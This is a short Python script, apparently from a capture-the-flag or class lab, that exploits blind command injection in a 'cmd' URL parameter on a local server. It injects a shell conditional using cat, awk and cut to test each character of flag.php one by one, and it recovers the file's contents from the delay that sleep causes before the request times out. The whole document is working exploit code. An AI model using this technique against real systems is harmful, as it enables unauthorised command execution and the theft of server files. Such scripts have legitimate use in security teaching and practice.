import requests
import time

url = "http://192.168.120.49:18080/class08/1.php"   #爆破网址
result = ""
for i in range(1,5):   #行数
    for j in range(1,55):  #列数
        for k in range(32,128):   #ASCLL码
            k=chr(k)
            #time.sleep(0.1)
            payload = "?cmd=" + f"if [ `cat flag.php | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"  #cmd为参数
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "